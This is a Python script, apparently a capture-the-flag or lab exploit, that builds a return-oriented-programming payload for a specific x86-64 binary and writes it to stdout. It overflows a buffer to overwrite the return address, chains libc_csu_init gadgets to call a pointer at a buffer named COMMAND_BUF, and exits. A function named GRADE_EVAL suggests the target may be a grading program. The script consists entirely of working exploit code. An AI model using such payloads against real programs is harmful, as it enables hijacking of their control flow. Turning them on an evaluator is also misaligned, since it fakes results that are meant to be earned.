import sys

GRADE_EVAL = 0x401978
COMMAND_BUF = 0x602090

POP_CSU = 0x401A2A
CALL_CSU = 0x401A10
RET = 0x401A34
EXIT_PLT = 0x4016E0

RET_OFFSET = 24

def q(value: int) -> bytes:
    return value.to_bytes(8, "little")

payload = q(GRADE_EVAL)
payload += b"A" * (RET_OFFSET - len(payload))
payload += q(RET)
payload += q(POP_CSU)
payload += q(0)
payload += q(1)
payload += q(COMMAND_BUF)
payload += q(4)
payload += q(0)
payload += q(0)
payload += q(CALL_CSU)
payload += q(0) * 7
payload += q(EXIT_PLT)

sys.stdout.buffer.write(payload)
